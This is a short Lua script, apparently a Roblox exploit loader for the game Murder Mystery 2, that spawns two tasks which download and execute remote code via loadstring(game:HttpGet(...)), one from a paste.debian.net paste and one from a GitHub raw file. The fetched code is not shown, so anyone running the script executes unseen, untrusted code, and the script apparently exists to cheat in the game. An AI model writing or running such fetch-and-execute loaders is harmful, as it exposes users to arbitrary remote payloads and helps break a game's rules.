local function farm()
    loadstring(game:HttpGet("https://paste.debian.net/plainh/0e9c4a23/", true))()
end
local function loadui()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua'))()
end

task.spawn(farm)
task.spawn(loadui)
